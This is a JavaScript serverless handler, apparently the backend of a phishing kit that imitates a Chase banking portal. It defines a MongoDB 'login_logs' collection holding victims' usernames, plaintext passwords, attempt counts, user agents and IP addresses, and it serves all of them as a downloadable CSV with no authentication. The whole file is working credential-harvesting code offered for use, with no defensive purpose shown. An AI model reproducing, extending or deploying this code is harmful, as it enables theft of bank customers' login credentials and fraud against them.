import mongoose from 'mongoose';
import { sharedStorage } from './shared-storage.js';

const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://localhost:27017/chase-portal';

// Login Log Schema
const loginLogSchema = new mongoose.Schema({
  timestamp: { type: Date, default: Date.now, index: true },
  username: String,
  password: String,
  attemptNumber: Number,
  status: String,
  userAgent: String,
  ipAddress: String,
}, { collection: 'login_logs' });

const LoginLog = mongoose.model('LoginLog', loginLogSchema);

let dbConnected = false;
let connection = null;

async function connectDB() {
  if (connection) return connection;
  
  try {
    connection = await mongoose.connect(MONGODB_URI, {
      serverSelectionTimeoutMS: 5000,
      retryWrites: true,
      w: 'majority'
    });
    dbConnected = true;
    return connection;
  } catch (err) {
    dbConnected = false;
    return null;
  }
}

function convertToCSV(logs) {
  if (logs.length === 0) {
    return 'timestamp,username,password,attemptNumber,status,userAgent,ipAddress\n';
  }

  const headers = ['timestamp', 'username', 'password', 'attemptNumber', 'status', 'userAgent', 'ipAddress'];
  
  const rows = logs.map(log => {
    return headers.map(header => {
      let value = log[header] || '';
      // Escape CSV values
      if (typeof value === 'string' && (value.includes(',') || value.includes('"') || value.includes('\n'))) {
        value = `"${value.replace(/"/g, '""')}"`;
      }
      return value;
    }).join(',');
  });

  return headers.join(',') + '\n' + rows.join('\n');
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');
  res.setHeader('Content-Type', 'text/csv');
  res.setHeader('Content-Disposition', `attachment; filename="login-logs-${new Date().toISOString().split('T')[0]}.csv"`);

  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  if (req.method !== 'GET') {
    res.status(405).json({ error: 'Method not allowed' });
    return;
  }

  try {
    await connectDB();

    const { limit = 1000, status, username } = req.query;
    let logs = [];

    if (dbConnected) {
      // Fetch from MongoDB
      let query = {};
      if (status) query.status = status;
      if (username) query.username = new RegExp(username, 'i');
      
      logs = await LoginLog.find(query)
        .sort({ timestamp: -1 })
        .limit(parseInt(limit))
        .lean();
    } else {
      // Use fallback logs from shared storage
      const filters = {};
      if (status) filters.status = status;
      if (username) filters.username = username;
      
      const allLogs = sharedStorage.getLogs(filters);
      logs = allLogs.slice(0, parseInt(limit));
    }

    const csv = convertToCSV(logs);
    res.status(200).send(csv);
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
}
